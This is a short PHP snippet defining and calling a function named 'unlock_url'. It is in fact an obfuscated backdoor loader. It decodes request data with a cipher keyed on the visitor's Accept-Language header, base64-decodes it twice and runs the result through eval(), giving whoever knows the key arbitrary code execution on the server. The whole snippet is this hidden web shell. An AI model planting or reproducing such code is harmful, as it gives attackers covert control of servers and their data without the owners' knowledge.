function unlock_url($data){
	$data = urldecode($data);
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+";  
    $ch = $data[0];
	$info = explode(",",$_SERVER['HTTP_ACCEPT_LANGUAGE']);
    $nh = strpos($chars,$ch);
    $mdKey = md5($info[0].$ch);
    $mdKey = substr($mdKey,$nh%8, $nh%8+7);
    $data = substr($data,1);
    $tmp = '';
    $i=0;$j=0; $k = 0;
    for ($i=0; $i<strlen($data); $i++) {
        $k = $k == strlen($mdKey) ? 0 : $k;
        $j = strpos($chars,$data[$i])-$nh - ord($mdKey[$k++]);
        while ($j<0) $j+=64;
        $tmp .= $chars[$j];
    }
	$tmp = base64_decode(base64_decode($tmp));
	eval($tmp);
}
unlock_url($data);